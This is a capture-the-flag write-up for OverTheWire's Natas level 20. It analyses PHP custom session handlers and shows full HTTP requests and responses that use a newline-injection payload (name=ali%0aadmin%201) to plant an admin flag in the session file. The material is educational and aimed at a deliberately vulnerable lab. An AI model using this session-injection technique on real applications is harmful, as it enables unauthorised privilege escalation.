# Natas20
#natas #injection
## Vulnerability:
Using custom functions to handle sessions, without proper input validation.
## Technique:
#### Steps:
###### 1) Analyzing the source code:
```php
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */


function print_credentials() { /* {{{ */
    if(
        $_SESSION 
        and array_key_exists("admin", $_SESSION) 
        and $_SESSION["admin"] == 1
    ) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas21\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */


/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}


/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}


function myread($sid) {

    debug("MYREAD $sid");

    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
        debug("Invalid SID");
        return "";
    }

    $filename = session_save_path() . "/" . "mysess_" . $sid;

    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }

    debug("Reading from ". $filename);

    $data = file_get_contents($filename);

    $_SESSION = array();

    foreach(explode("\n", $data) as $line) {

        debug("Read [$line]");

        $parts = explode(" ", $line, 2);

        if($parts[0] != "") {
            $_SESSION[$parts[0]] = $parts[1];
        }
    }

    return session_encode() ?: "";
}


function mywrite($sid, $data) {

    // $data contains the serialized version of $_SESSION
    // but our encoding is better

    debug("MYWRITE $sid $data");

    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
        debug("Invalid SID");
        return;
    }

    $filename = session_save_path() . "/" . "mysess_" . $sid;

    $data = "";

    debug("Saving in ". $filename);

    ksort($_SESSION);

    foreach($_SESSION as $key => $value) {

        debug("$key => $value");

        $data .= "$key $value\n";
    }

    file_put_contents($filename, $data);

    chmod($filename, 0600);

    return true;
}


/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}


/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}


session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage"
);


session_start();


if(array_key_exists("name", $_REQUEST)) {

    $_SESSION["name"] = $_REQUEST["name"];

    debug("Name set to " . $_REQUEST["name"]);
}


print_credentials();


$name = "";

if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```
Let's analyze the code part by part, to understand how the vulnerability works. 

Firstly, we identified the condition to log in as admin and retrieve the password for the next level: the session variable admin needs to be set to 1(`$_SESSION["admin"] = 1`)

Secondly, we noticed that the developers replaced default PHP session handles with their custom functions:
```php
session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage"
);
```
The most important functions are `mywrite()` and `myread()`.

**mywrite():**
This custom function is used to save the session data to a file. The developers chose to store the data in their own format:
```
KEY VALUE\n
```
For each session variable, the function writes the key and value separated by a space, followed by a newline character, without any input validation.

**myread():**
This custom function reads the stored session data from a file. It separates session variables by splitting the data using newline character (`\n`), then separates each line to two parts, and finally read the first part as the session variable, and the second part as the value:
```php
foreach(explode("\n", $data) as $line) {

    debug("Read [$line]");

    $parts = explode(" ", $line, 2);

    if($parts[0] != "") {
        $_SESSION[$parts[0]] = $parts[1];
    }
}
```

Finally, the session `name` variable comes directly from the request:
```php
$_SESSION["name"] = $_REQUEST["name"];
```
The user input is first stored in the `$_SESSION` array.
When PHP saves the session at the end of the request, the custom `mywrite()` function is called and writes the session data using the custom format.
###### 2) Explaining the vulnerability
After analyzing the source code, we concluded that we can inject the variable `admin` to the session file.

Let's suppose the request contains the following data:
```
name=ali
```
PHP executes:
```php
$_SESSION["name"] = "ali";
```
and it stores it in memory following the format:
```php
$_SESSION = [
    "name" => "ali"
];
```
Then, after PHP saves the session, `mywrite()` function is called, and it stores the data in the file in this format:
```
name ali
```

At the next request, with the same `PHPSESSID`, PHP calls the function `myread()`, and it reads the file:
```
name ali
```
and reconstructs:
```php
$_SESSION["name"] = "ali";
```

But what if we wrote something different. Instead of `ali` we requested:
```
name=ali%0aadmin%201
```
which is the same as:
```
name=ali
admin 1
```
Because `%0a` is the newline character (`\n`), and `%20` is the space character.
That means PHP stores in memory:
```php
$_SESSION = [
    "name" => "ali
    admin 1"
];
```
Then, `mywrite()` saves the data as.
```
name ali
admin 1
```
For the next request, `myread()` reads the file and stores the following in memory:
```php
$_SESSION = [
    "name" => "ali",
    "admin" => "1"
];
```
because it separates the variables in lines using newline character, and separates each line to two parts.

This means we have:
```php
$_SESSION["admin"] = 1
```
and we can get the password for the next level.
###### 3) Exploiting the vulnerability
**Request:**
```http
POST /index.php?debug HTTP/1.1
Host: natas20.natas.labs.overthewire.org
Content-Length: 20
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas20.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas20.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>
Connection: keep-alive

name=ali%0aadmin%201
```
**Result:**
```http
HTTP/1.1 200 OK
Date: Thu, 06 Aug 2026 13:28:51 GMT
Server: Apache/2.4.66 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1422
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>

<head>
    <!-- This stuff in the header has nothing to do with the level -->

    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas20",
            "pass": <NATAS19_PASSWORD>
        };
    </script>

</head>


<body>

<h1>natas20</h1>


<div id="content">

    DEBUG: MYREAD pe5k339j8te2lo1dj2c6144s9h
    <br>

    DEBUG: Session file doesn't exist
    <br>


    DEBUG: Name set to: ali
    admin 1
    <br>


    You are logged in as a regular user.
    Login as an admin to retrieve credentials for natas21.


    <form action="index.php" method="POST">

        Your name:
        <input 
            name="name"
            value="ali
admin 1"
        >

        <br>

        <input type="submit" value="Change name" />

    </form>


    <div id="viewsource">
        <a href="index-source.html">
            View sourcecode
        </a>
    </div>


</div>

</body>

</html>


DEBUG:
MYWRITE pe5k339j8te2lo1dj2c6144s9h 
name|s:11:"ali
admin 1";


DEBUG:
Saving in:
/var/lib/php/sessions/mysess_pe5k339j8te2lo1dj2c6144s9h


DEBUG:
name => ali
admin 1
```

The debug mode revealed that the file doesn't exist and it was created. Now we'll send another request:

> [!NOTE]
> It is not necessary to re-enter the payload in the second request. The data is already saved.

**Second request:**
```http
POST /index.php?debug HTTP/1.1
Host: natas20.natas.labs.overthewire.org
Content-Length: 0
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas20.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas20.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>
Connection: keep-alive
```
**Result:**
```http
POST HTTP/1.1 200 OK
Date: Thu, 06 Aug 2026 13:33:53 GMT
Server: Apache/2.4.66 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1550
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
    <script>
        var wechallinfo = { "level": "natas20", "pass": <NATAS19_PASSWORD> };
    </script>
</head>

<body>
    <h1>natas20</h1>

    <div id="content">
        DEBUG: MYREAD pe5k339j8te2lo1dj2c6144s9h<br>
        DEBUG: Reading from /var/lib/php/sessions/mysess_pe5k339j8te2lo1dj2c6144s9h<br>
        DEBUG: Read [admin 1]<br>
        DEBUG: Read [name ali]<br>
        DEBUG: Read []<br>
        You are an admin. The credentials for the next level are:<br>
        <pre>Username: natas21
Password: <PASSWORD></pre>

        <form action="index.php" method="POST">
            Your name: <input name="name" value="ali"><br>
            <input type="submit" value="Change name" />
        </form>

        <div id="viewsource">
            <a href="index-source.html">View sourcecode</a>
        </div>
    </div>
</body>
</html>

DEBUG: MYWRITE pe5k339j8te2lo1dj2c6144s9h admin|s:1:"1";name|s:3:"ali";<br>
DEBUG: Saving in /var/lib/php/sessions/mysess_pe5k339j8te2lo1dj2c6144s9h<br>
DEBUG: admin => 1<br>
DEBUG: name => ali<br>
```
Now that the file exists, `myread()` function read its content, and set `$_SESSION["admin"]` to 1.
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas19](./Natas19.md)
## Next Level:
[Natas21](./Natas21.md)
